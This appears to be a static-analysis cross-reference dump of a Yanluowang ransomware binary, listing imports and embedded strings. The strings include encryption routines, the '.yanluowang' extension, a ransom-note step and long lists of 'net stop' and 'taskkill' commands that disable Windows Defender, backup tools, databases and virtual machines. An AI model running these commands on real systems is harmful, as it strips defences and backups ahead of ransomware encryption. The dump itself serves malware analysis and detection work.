reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x403c1b	0x455640	string	0x403ab0	\\?\
0x403c91	0x4471c8	import	0x403ab0	KERNEL32.dll.FindFirstFileW
0x403cbb	0x4470a0	import	0x403ab0	KERNEL32.dll.CreateFileW
0x403ccb	0x4470f0	import	0x403ab0	KERNEL32.dll.GetFileSizeEx
0x403d12	0x45564c	string	0x403ab0	encrypt
0x403d92	0x455654	string	0x403ab0	decrypt
0x403ddd	0x447060	import	0x403ab0	KERNEL32.dll.GetSystemTime
0x403deb	0x44705c	import	0x403ab0	KERNEL32.dll.SystemTimeToFileTime
0x403e32	0x4471d0	import	0x403ab0	KERNEL32.dll.ReadFile
0x403e94	0x447054	import	0x403ab0	KERNEL32.dll.SetFilePointerEx
0x403eb2	0x447084	import	0x403ab0	KERNEL32.dll.WriteFile
0x403f0e	0x447054	import	0x403ab0	KERNEL32.dll.SetFilePointerEx
0x403f3f	0x447054	import	0x403ab0	KERNEL32.dll.SetFilePointerEx
0x403f5f	0x447084	import	0x403ab0	KERNEL32.dll.WriteFile
0x403f76	0x44707c	import	0x403ab0	KERNEL32.dll.SetFileTime
0x403f85	0x44704c	import	0x403ab0	KERNEL32.dll.CloseHandle
0x403fe7	0x45565c	string	0x403ab0	.yanluowang
0x404053	0x455668	string	0x403ab0	.yanluowang
0x40408f	0x455640	string	0x403ab0	\\?\
0x404115	0x455640	string	0x403ab0	\\?\
0x40419c	0x447064	import	0x403ab0	KERNEL32.dll.MoveFileW
0x4042db	0x455690	string	0x403ab0	Stop writing
0x4042ed	0x455680	string	0x403ab0	Stop reading
0x4046ef	0x45565c	string	0x404680	.yanluowang
0x404938	0x404941	string	0x404880	h,WE
0x404967	0x44708c	import	0x404880	KERNEL32.dll.FindFirstFileA
0x40498b	0x447094	import	0x404880	KERNEL32.dll.GetLastError
0x405403	0x447098	import	0x405370	KERNEL32.dll.CreateToolhelp32Snapshot
0x405422	0x447048	import	0x405370	KERNEL32.dll.Process32FirstW
0x4056dd	0x45564c	string	0x405690	encrypt
0x405986	0x45579c	string	0x405690	--help
0x405abc	0x447050	import	0x405690	KERNEL32.dll.GetLogicalDriveStringsA
0x405c7b	0x4557a4	string	0x405690	-pass
0x405ccc	0x4557ac	string	0x405690	--pass
0x405de9	0x4557b4	string	0x405690	pass
0x405e75	0x4557c0	string	0x405690	-path
0x405ec2	0x4557c8	string	0x405690	--path
0x406052	0x4557d0	string	0x405690	path
0x40607d	0x4557b4	string	0x405690	pass
0x4060c3	0x454f10	string	0x405690	D86BDXL9N3H
0x406158	0x4557d0	string	0x405690	path
0x40625e	0x44708c	import	0x405690	KERNEL32.dll.FindFirstFileA
0x4062dc	0x4557d8	string	0x405690	bad path:
0x4063e8	0x4557e4	string	0x405690	invalid argument
0x406434	0x4557f8	string	0x405690	invalid value for argument
0x406484	0x455814	string	0x405690	Syntax: encrypt.exe [(-p,-path,--path)<path>]
0x406739	0x447068	import	0x405690	KERNEL32.dll.GetDriveTypeW
0x40696e	0x447034	import	0x405690	CRYPT32.dll.CryptStringToBinaryA
0x406978	0x447058	import	0x405690	KERNEL32.dll.LocalFree
0x406984	0x447070	import	0x405690	KERNEL32.dll.LocalAlloc
0x4069ac	0x447038	import	0x405690	CRYPT32.dll.CryptDecodeObjectEx
0x4069d6	0x447058	import	0x405690	KERNEL32.dll.LocalFree
0x406a1b	0x447014	import	0x405690	ADVAPI32.dll.CryptAcquireContextW
0x406a31	0x447040	import	0x405690	CRYPT32.dll.CryptImportPublicKeyInfo
0x406a37	0x44701c	import	0x405690	ADVAPI32.dll.CryptEncrypt
0x406ad1	0x44703c	import	0x405690	CRYPT32.dll.CryptBinaryToStringA
0x406b06	0x44703c	import	0x405690	CRYPT32.dll.CryptBinaryToStringA
0x406bc2	0x455844	string	0x405690	/c powershell -command "Get-VM | Stop-VM -Force"
0x406bc7	0x455878	string	0x405690	cmd.exe
0x406bcc	0x4556d8	string	0x405690	open
0x406bd5	0x4471d8	import	0x405690	SHELL32.dll.ShellExecuteA
0x406be3	0x455880	string	0x405690	net stop MSSQLServerADHelper100
0x406be8	0x455878	string	0x405690	cmd.exe
0x406bed	0x4556d8	string	0x405690	open
0x406bfa	0x4558a0	string	0x405690	net stop MSSQL$ISARS
0x406bff	0x455878	string	0x405690	cmd.exe
0x406c04	0x4556d8	string	0x405690	open
0x406c11	0x4558b8	string	0x405690	net stop MSSQL$MSFW
0x406c16	0x455878	string	0x405690	cmd.exe
0x406c1b	0x4556d8	string	0x405690	open
0x406c28	0x4558cc	string	0x405690	net stop SQLAgent$ISARS
0x406c2d	0x455878	string	0x405690	cmd.exe
0x406c32	0x4556d8	string	0x405690	open
0x406c3f	0x4558e4	string	0x405690	net stop SQLAgent$MSFW
0x406c44	0x455878	string	0x405690	cmd.exe
0x406c49	0x4556d8	string	0x405690	open
0x406c56	0x4558fc	string	0x405690	net stop SQLBrowser
0x406c5b	0x455878	string	0x405690	cmd.exe
0x406c60	0x4556d8	string	0x405690	open
0x406c6d	0x455910	string	0x405690	net stop ReportServer$ISARS
0x406c72	0x455878	string	0x405690	cmd.exe
0x406c77	0x4556d8	string	0x405690	open
0x406c84	0x45592c	string	0x405690	net stop SQLWriter
0x406c89	0x455878	string	0x405690	cmd.exe
0x406c8e	0x4556d8	string	0x405690	open
0x406c9b	0x455940	string	0x405690	net stop WinDefend
0x406ca0	0x455878	string	0x405690	cmd.exe
0x406ca5	0x4556d8	string	0x405690	open
0x406cb2	0x455954	string	0x405690	net stop mr2kserv
0x406cb7	0x455878	string	0x405690	cmd.exe
0x406cbc	0x4556d8	string	0x405690	open
0x406cc9	0x455968	string	0x405690	net stop MSExchangeADTopology
0x406cce	0x455878	string	0x405690	cmd.exe
0x406cd3	0x4556d8	string	0x405690	open
0x406ce0	0x455988	string	0x405690	net stop MSExchangeFBA
0x406ce5	0x455878	string	0x405690	cmd.exe
0x406cea	0x4556d8	string	0x405690	open
0x406cf7	0x4559a0	string	0x405690	net stop MSExchangeIS
0x406cfc	0x455878	string	0x405690	cmd.exe
0x406d01	0x4556d8	string	0x405690	open
0x406d0e	0x4559b8	string	0x405690	net stop MSExchangeSA
0x406d13	0x455878	string	0x405690	cmd.exe
0x406d18	0x4556d8	string	0x405690	open
0x406d25	0x4559d0	string	0x405690	net stop ShadowProtectSvc
0x406d2a	0x455878	string	0x405690	cmd.exe
0x406d2f	0x4556d8	string	0x405690	open
0x406d3c	0x4559ec	string	0x405690	net stop SPAdminV4
0x406d41	0x455878	string	0x405690	cmd.exe
0x406d46	0x4556d8	string	0x405690	open
0x406d53	0x455a00	string	0x405690	net stop SPTimerV4
0x406d58	0x455878	string	0x405690	cmd.exe
0x406d5d	0x4556d8	string	0x405690	open
0x406d6a	0x455a14	string	0x405690	net stop SPTraceV4
0x406d6f	0x455878	string	0x405690	cmd.exe
0x406d74	0x4556d8	string	0x405690	open
0x406d81	0x455a28	string	0x405690	net stop SPUserCodeV4
0x406d86	0x455878	string	0x405690	cmd.exe
0x406d8b	0x4556d8	string	0x405690	open
0x406d98	0x455a40	string	0x405690	net stop SPWriterV4
0x406d9d	0x455878	string	0x405690	cmd.exe
0x406da2	0x4556d8	string	0x405690	open
0x406daf	0x455a54	string	0x405690	net stop SPSearch4
0x406db4	0x455878	string	0x405690	cmd.exe
0x406db9	0x4556d8	string	0x405690	open
0x406dc6	0x455880	string	0x405690	net stop MSSQLServerADHelper100
0x406dcb	0x455878	string	0x405690	cmd.exe
0x406dd0	0x4556d8	string	0x405690	open
0x406ddd	0x455a68	string	0x405690	net stop IISADMIN
0x406de2	0x455878	string	0x405690	cmd.exe
0x406de7	0x4556d8	string	0x405690	open
0x406df4	0x455a7c	string	0x405690	net stop firebirdguardiandefaultinstance
0x406df9	0x455878	string	0x405690	cmd.exe
0x406dfe	0x4556d8	string	0x405690	open
0x406e0b	0x455aa8	string	0x405690	net stop ibmiasrw
0x406e10	0x455878	string	0x405690	cmd.exe
0x406e15	0x4556d8	string	0x405690	open
0x406e22	0x455abc	string	0x405690	net stop QBCFMonitorService
0x406e27	0x455878	string	0x405690	cmd.exe
0x406e2c	0x4556d8	string	0x405690	open
0x406e39	0x455ad8	string	0x405690	net stop QBVSS
0x406e3e	0x455878	string	0x405690	cmd.exe
0x406e43	0x4556d8	string	0x405690	open
0x406e50	0x455ae8	string	0x405690	net stop QBPOSDBServiceV12
0x406e55	0x455878	string	0x405690	cmd.exe
0x406e5a	0x4556d8	string	0x405690	open
0x406e67	0x455b04	string	0x405690	net stop "IBM Domino Server (CProgramFilesIBMDominodata)"
0x406e6c	0x455878	string	0x405690	cmd.exe
0x406e71	0x4556d8	string	0x405690	open
0x406e7e	0x455b40	string	0x405690	net stop "IBM Domino Diagnostics (CProgramFilesIBMDomino)"
0x406e83	0x455878	string	0x405690	cmd.exe
0x406e88	0x4556d8	string	0x405690	open
0x406e95	0x455a68	string	0x405690	net stop IISADMIN
0x406e9a	0x455878	string	0x405690	cmd.exe
0x406e9f	0x4556d8	string	0x405690	open
0x406eac	0x455b7c	string	0x405690	net stop "Simply Accounting Database Connection Manager"
0x406eb1	0x455878	string	0x405690	cmd.exe
0x406eb6	0x4556d8	string	0x405690	open
0x406ec3	0x455bb8	string	0x405690	net stop QuickBooksDB1
0x406ec8	0x455878	string	0x405690	cmd.exe
0x406ecd	0x4556d8	string	0x405690	open
0x406eda	0x455bd0	string	0x405690	net stop QuickBooksDB2
0x406edf	0x455878	string	0x405690	cmd.exe
0x406ee4	0x4556d8	string	0x405690	open
0x406ef1	0x455be8	string	0x405690	net stop QuickBooksDB3
0x406ef6	0x455878	string	0x405690	cmd.exe
0x406efb	0x4556d8	string	0x405690	open
0x406f08	0x455c00	string	0x405690	net stop QuickBooksDB4
0x406f0d	0x455878	string	0x405690	cmd.exe
0x406f12	0x4556d8	string	0x405690	open
0x406f1f	0x455c18	string	0x405690	net stop QuickBooksDB5
0x406f24	0x455878	string	0x405690	cmd.exe
0x406f29	0x4556d8	string	0x405690	open
0x406f36	0x455c30	string	0x405690	net stop QuickBooksDB6
0x406f3b	0x455878	string	0x405690	cmd.exe
0x406f40	0x4556d8	string	0x405690	open
0x406f4d	0x455c48	string	0x405690	net stop QuickBooksDB7
0x406f52	0x455878	string	0x405690	cmd.exe
0x406f57	0x4556d8	string	0x405690	open
0x406f64	0x455c60	string	0x405690	net stop QuickBooksDB8
0x406f69	0x455878	string	0x405690	cmd.exe
0x406f6e	0x4556d8	string	0x405690	open
0x406f7b	0x455c78	string	0x405690	net stop QuickBooksDB9
0x406f80	0x455878	string	0x405690	cmd.exe
0x406f85	0x4556d8	string	0x405690	open
0x406f92	0x455c90	string	0x405690	net stop QuickBooksDB10
0x406f97	0x455878	string	0x405690	cmd.exe
0x406f9c	0x4556d8	string	0x405690	open
0x406fa9	0x455ca8	string	0x405690	net stop QuickBooksDB11
0x406fae	0x455878	string	0x405690	cmd.exe
0x406fb3	0x4556d8	string	0x405690	open
0x406fc0	0x455cc0	string	0x405690	net stop QuickBooksDB12
0x406fc5	0x455878	string	0x405690	cmd.exe
0x406fca	0x4556d8	string	0x405690	open
0x406fd7	0x455cd8	string	0x405690	net stop QuickBooksDB13
0x406fdc	0x455878	string	0x405690	cmd.exe
0x406fe1	0x4556d8	string	0x405690	open
0x406fee	0x455cf0	string	0x405690	net stop QuickBooksDB14
0x406ff3	0x455878	string	0x405690	cmd.exe
0x406ff8	0x4556d8	string	0x405690	open
0x407005	0x455d08	string	0x405690	net stop QuickBooksDB15
0x40700a	0x455878	string	0x405690	cmd.exe
0x40700f	0x4556d8	string	0x405690	open
0x40701c	0x455d20	string	0x405690	net stop QuickBooksDB16
0x407021	0x455878	string	0x405690	cmd.exe
0x407026	0x4556d8	string	0x405690	open
0x407033	0x455d38	string	0x405690	net stop QuickBooksDB17
0x407038	0x455878	string	0x405690	cmd.exe
0x40703d	0x4556d8	string	0x405690	open
0x40704a	0x455d50	string	0x405690	net stop QuickBooksDB18
0x40704f	0x455878	string	0x405690	cmd.exe
0x407054	0x4556d8	string	0x405690	open
0x407061	0x455d68	string	0x405690	net stop QuickBooksDB19
0x407066	0x455878	string	0x405690	cmd.exe
0x40706b	0x4556d8	string	0x405690	open
0x407078	0x455d80	string	0x405690	net stop QuickBooksDB20
0x40707d	0x455878	string	0x405690	cmd.exe
0x407082	0x4556d8	string	0x405690	open
0x40708f	0x455d98	string	0x405690	net stop QuickBooksDB21
0x407094	0x455878	string	0x405690	cmd.exe
0x407099	0x4556d8	string	0x405690	open
0x4070a6	0x455db0	string	0x405690	net stop QuickBooksDB22
0x4070ab	0x455878	string	0x405690	cmd.exe
0x4070b0	0x4556d8	string	0x405690	open
0x4070bd	0x455dc8	string	0x405690	net stop QuickBooksDB23
0x4070c2	0x455878	string	0x405690	cmd.exe
0x4070c7	0x4556d8	string	0x405690	open
0x4070d4	0x455de0	string	0x405690	net stop QuickBooksDB24
0x4070d9	0x455878	string	0x405690	cmd.exe
0x4070de	0x4556d8	string	0x405690	open
0x4070eb	0x455df8	string	0x405690	net stop QuickBooksDB25
0x4070f0	0x455878	string	0x405690	cmd.exe
0x4070f5	0x4556d8	string	0x405690	open
0x407102	0x455e10	string	0x405690	taskkill /f /im mysql*
0x407107	0x455878	string	0x405690	cmd.exe
0x40710c	0x4556d8	string	0x405690	open
0x407119	0x455e28	string	0x405690	taskkill /f /im dsa*
0x40711e	0x455878	string	0x405690	cmd.exe
0x407123	0x4556d8	string	0x405690	open
0x407130	0x455e40	string	0x405690	taskkill /f /im veeam*
0x407135	0x455878	string	0x405690	cmd.exe
0x40713a	0x4556d8	string	0x405690	open
0x407147	0x455e58	string	0x405690	taskkill /f /im chrome*
0x40714c	0x455878	string	0x405690	cmd.exe
0x407151	0x4556d8	string	0x405690	open
0x40715e	0x455e70	string	0x405690	taskkill /f /im iexplore*
0x407163	0x455878	string	0x405690	cmd.exe
0x407168	0x4556d8	string	0x405690	open
0x407175	0x455e8c	string	0x405690	taskkill /f /im firefox*
0x40717a	0x455878	string	0x405690	cmd.exe
0x40717f	0x4556d8	string	0x405690	open
0x40718c	0x455ea8	string	0x405690	taskkill /f /im outlook*
0x407191	0x455878	string	0x405690	cmd.exe
0x407196	0x4556d8	string	0x405690	open
0x4071a3	0x455ec4	string	0x405690	taskkill /f /im excel*
0x4071a8	0x455878	string	0x405690	cmd.exe
0x4071ad	0x4556d8	string	0x405690	open
0x4071ba	0x455ea8	string	0x405690	taskkill /f /im outlook*
0x4071bf	0x455878	string	0x405690	cmd.exe
0x4071c4	0x4556d8	string	0x405690	open
0x4071d1	0x455edc	string	0x405690	taskkill /f /im taskmgr*
0x4071d6	0x455878	string	0x405690	cmd.exe
0x4071db	0x4556d8	string	0x405690	open
0x4071e8	0x455ef8	string	0x405690	taskkill /f /im tasklist*
0x4071ed	0x455878	string	0x405690	cmd.exe
0x4071f2	0x4556d8	string	0x405690	open
0x4071ff	0x455f14	string	0x405690	taskkill /f /im Ntrtscan*
0x407204	0x455878	string	0x405690	cmd.exe
0x407209	0x4556d8	string	0x405690	open
0x407216	0x455f30	string	0x405690	taskkill /f /im ds_monitor*
0x40721b	0x455878	string	0x405690	cmd.exe
0x407220	0x4556d8	string	0x405690	open
0x40722d	0x455f4c	string	0x405690	taskkill /f /im Notifier*
0x407232	0x455878	string	0x405690	cmd.exe
0x407237	0x4556d8	string	0x405690	open
0x407244	0x455f68	string	0x405690	taskkill /f /im putty*
0x407249	0x455878	string	0x405690	cmd.exe
0x40724e	0x4556d8	string	0x405690	open
0x40725b	0x455f80	string	0x405690	taskkill /f /im ssh*
0x407260	0x455878	string	0x405690	cmd.exe
0x407265	0x4556d8	string	0x405690	open
0x407272	0x455f98	string	0x405690	taskkill /f /im TmListen*
0x407277	0x455878	string	0x405690	cmd.exe
0x40727c	0x4556d8	string	0x405690	open
0x407289	0x455fb4	string	0x405690	taskkill /f /im iVPAgent*
0x40728e	0x455878	string	0x405690	cmd.exe
0x407293	0x4556d8	string	0x405690	open
0x4072a0	0x455fd0	string	0x405690	taskkill /f /im CNTAoSMgr*
0x4072a5	0x455878	string	0x405690	cmd.exe
0x4072aa	0x4556d8	string	0x405690	open
0x4072b7	0x455fec	string	0x405690	taskkill /f /im IBM*
0x4072bc	0x455878	string	0x405690	cmd.exe
0x4072c1	0x4556d8	string	0x405690	open
0x4072ce	0x456004	string	0x405690	taskkill /f /im bes10*
0x4072d3	0x455878	string	0x405690	cmd.exe
0x4072d8	0x4556d8	string	0x405690	open
0x4072e5	0x45601c	string	0x405690	taskkill /f /im black*
0x4072ea	0x455878	string	0x405690	cmd.exe
0x4072ef	0x4556d8	string	0x405690	open
0x4072fc	0x456034	string	0x405690	taskkill /f /im robo*
0x407301	0x455878	string	0x405690	cmd.exe
0x407306	0x4556d8	string	0x405690	open
0x407313	0x45604c	string	0x405690	taskkill /f /im copy*
0x407318	0x455878	string	0x405690	cmd.exe
0x40731d	0x4556d8	string	0x405690	open
0x40732a	0x456064	string	0x405690	taskkill /f /im sql
0x40732f	0x455878	string	0x405690	cmd.exe
0x407334	0x4556d8	string	0x405690	open
0x407341	0x456078	string	0x405690	taskkill /f /im store.exe
0x407346	0x455878	string	0x405690	cmd.exe
0x40734b	0x4556d8	string	0x405690	open
0x407358	0x456094	string	0x405690	taskkill /f /im sql*
0x40735d	0x455878	string	0x405690	cmd.exe
0x407362	0x4556d8	string	0x405690	open
0x40736f	0x4560ac	string	0x405690	taskkill /f /im vee*
0x407374	0x455878	string	0x405690	cmd.exe
0x407379	0x4556d8	string	0x405690	open
0x407386	0x4560c4	string	0x405690	taskkill /f /im wrsa*
0x40738b	0x455878	string	0x405690	cmd.exe
0x407390	0x4556d8	string	0x405690	open
0x40739d	0x4560dc	string	0x405690	taskkill /f /im wrsa.exe
0x4073a2	0x455878	string	0x405690	cmd.exe
0x4073a7	0x4556d8	string	0x405690	open
0x4073b4	0x4560f8	string	0x405690	taskkill /f /im postg*
0x4073b9	0x455878	string	0x405690	cmd.exe
0x4073be	0x4556d8	string	0x405690	open
0x4073cb	0x456110	string	0x405690	taskkill /f /im sage*
0x4073d0	0x455878	string	0x405690	cmd.exe
0x4073d5	0x4556d8	string	0x405690	open
0x4076c9	0x44706c	import	0x405690	KERNEL32.dll.CreateFileA
0x4076d9	0x4470f0	import	0x405690	KERNEL32.dll.GetFileSizeEx
0x4076e0	0x44704c	import	0x405690	KERNEL32.dll.CloseHandle
0x4077a7	0x4471d8	import	0x405690	SHELL32.dll.ShellExecuteA
0x4077bf	0x4470a4	import	0x405690	KERNEL32.dll.GetCurrentDirectoryA
0x407869	0x455634	string	0x405690	\README.txt
0x407976	0x4556a0	string	0x405690	/c for /l %x in (1,1,3) do start wordpad.exe /p
0x4079ab	0x4556d8	string	0x405690	open
0x407d89	0x40bb90	string	0x405690	h`aE
0x407d98	0x4092b0	string	0x405690	h<aE
0x407da7	0x401a20	string	0x405690	hhME
0x407dac	0x401a20	string	0x405690	hhME
0x407feb	0x454ed4	string	0x407fe0	Sosemanuk
0x4085d6	0x4085e5	string	0x408550	3ɋE\b@ blocks=Basic Latin,Latin Extended-B
0x4092b0	0x45613c	string	0x4092b0	invalid vector subscript
0x40a660	0x4561ac	string	0x40a660	invalid string position
0x40b98f	0x401a20	string	0x40b840	hhME
0x40bb90	0x456160	string	0x40bb90	vector too long
0x40cad1	0x401a20	string	0x40c9a0	hhME
0x40cd92	0x4472b8	string	0x40cd88	bad allocation
0x40cf23	0x42ff79	string	0x40cf18	j\fh
0x40d8f0	0x430bc5	string	0x40d89c	j\fh(E
0x40dcbf	0x430bc5	string	0x40daad	j\fh(E
0x40dd7b	0x40dd91	string	0x40daad	^[_Ã blocks=Basic Latin,Latin-1 Supplement
0x40e4a9	0x447958	string	0x40e497	address family not supported
0x40e4b0	0x447f7c	string	0x40e497	unknown error
0x40e79c	0x4470b8	import	0x40e796	KERNEL32.dll.DeleteCriticalSection
0x40e7b1	0x4470b4	import	0x40e7a4	KERNEL32.dll.InitializeCriticalSectionEx
0x40e7bf	0x4470ac	import	0x40e7b9	KERNEL32.dll.EnterCriticalSection
0x40e7cd	0x4470b0	import	0x40e7c7	KERNEL32.dll.LeaveCriticalSection
0x40e949	0x4470c0	import	0x40e915	KERNEL32.dll.DecodePointer
0x40e990	0x4470bc	import	0x40e97d	KERNEL32.dll.EncodePointer
0x40ea0e	0x4470c4	import	0x40e9c5	KERNEL32.dll.MultiByteToWideChar
0x40ea79	0x4470c4	import	0x40e9c5	KERNEL32.dll.MultiByteToWideChar
0x40ea96	0x4470c8	import	0x40e9c5	KERNEL32.dll.LCMapStringEx
0x40ead5	0x4470c8	import	0x40e9c5	KERNEL32.dll.LCMapStringEx
0x40eb34	0x4470c8	import	0x40e9c5	KERNEL32.dll.LCMapStringEx
0x40eb57	0x4470a8	import	0x40e9c5	KERNEL32.dll.WideCharToMultiByte
0x40f507	0x4482b0	string	0x40f470	is not a valid key length
0x40f73d	0x40f741	string	0x40f6f0	j/h<
0x40f743	0x44823c	string	0x40f6f0	: this object doesn't support multiple channels
0x40f8b5	0x4483cc	string	0x40f880	AlgorithmParametersBase: parameter "
